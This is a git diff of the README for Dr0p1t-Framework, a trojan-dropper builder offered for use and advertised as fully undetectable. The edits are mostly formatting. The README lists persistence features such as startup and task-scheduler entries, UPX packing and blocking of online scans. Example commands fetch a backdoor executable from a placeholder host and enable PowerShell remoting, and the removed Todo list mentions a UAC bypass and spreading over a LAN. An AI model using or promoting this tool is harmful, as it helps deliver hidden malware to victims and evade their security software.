@@ -1,10 +1,11 @@
-# Dr0p1t-Framework (beta version) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
+# Dr0p1t-Framework (beta version) [![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/) ![Build Status](https://img.shields.io/badge/Version-1.0.1-red.svg)
+###### Version 1.0.1 , see CHANGELOG.md file
 
 Have you ever heard about trojan droppers ? you can read about them from [here](https://blog.malwarebytes.com/threats/trojan-dropper/).
 
 Dr0p1t let you create dropper like any tool but this time FUD with some tricks ;)
 
-#Features
+# Features
 - Works with Windows and Linux
 - Adding malware after downloading it to startup
 - Adding malware after downloading it to task scheduler
@@ -14,19 +15,19 @@ Dr0p1t let you create dropper like any tool but this time FUD with some tricks ;
 - Using UPX to compress the dropper after creating it
 - Choose an icon for the dropper after creating it
 
-#Screenshots
-##On Windows
+# Screenshots
+## On Windows
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random2.JPG" width="55%"></img>
 
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Windows/Random1.JPG" width="40%"></img>
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/raw/master/Screenshots/Windows/Help_msg.JPG" width="35%"></img>
-##On Linux (Backbox)
+## On Linux (Backbox)
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random1.JPG" width="55%"></img>
 
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Random2.JPG" width="40%"></img>
 <img src="https://github.com/D4Vinci/Dr0p1t-Framework/blob/master/Screenshots/Linux/Help_msg.JPG" width="35%"></img>
 
-###Help menu
+### Help menu
 ```
 Usage: Dr0p1t.py Malware_Url [Options]
 
@@ -46,23 +47,21 @@ options:
   -u           Check for updates
   -nd          Display less output information
 ```
-###Examples
+### Examples
 ```
 ./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
 ./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
 ./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
 ```
-#Prerequisites
-- Python 3.x( prefered 3.5 )
+# Prerequisites
+- Python 3.x( prefered 3.5 and don't use 3.6 because it's not supported yet by PyInstaller )
 - Python libraries requirements in requirements.txt
 
-#Installation
-First download it by
-```
-git clone https://github.com/D4Vinci/Dr0p1t-Framework
-```
+# Installation
 if you are on linux and do
 ```
+git clone https://github.com/D4Vinci/Dr0p1t-Framework
+chmod 777 -R Dr0p1t-Framework
 cd Dr0p1t-Framework
 pip install -r requirements.txt
 ./Dr0p1t.py
@@ -76,19 +75,19 @@ pip install -r windows_requirements.txt
 ```
 Libraries in windows_requirements.txt are used to enable unicodes in windows which will make coloring possible :smile:
 
+## Todo
 
-##Todo
-- Python 2 support
-- Work on UAC bypass
-- Work on spreading on device and may be in lan too
-- Injecting dr0pp3r to another program
-- More modules
+[Check out this link](https://github.com/D4Vinci/Dr0p1t-Framework/projects/1)
 
-[Stay Tuned](https://github.com/D4Vinci/Dr0p1t-Framework/projects/1)
+## Contact
+- [Twitter](https://twitter.com/D4Vinci1)
+- [Facebook](https://www.facebook.com/kareem.shoair)
 
-##Disclaimer
-Dr0p1t Framework not responsible for misuse and for illegal purposes.Use it only for work or educational purpose !!!
+## Disclaimer
+Dr0p1t Framework not responsible for misuse and for illegal purposes. Use it only for work or educational purpose !!!
 
-> Pull requests are always welcomed :)
+Copying a code from this framework or using it in another tool is accepted as you mention where you get it from :smile:
 
-#Much more features to come!
+> Pull requests are always welcomed :D
+
+# Much more features to come, stay tuned !!
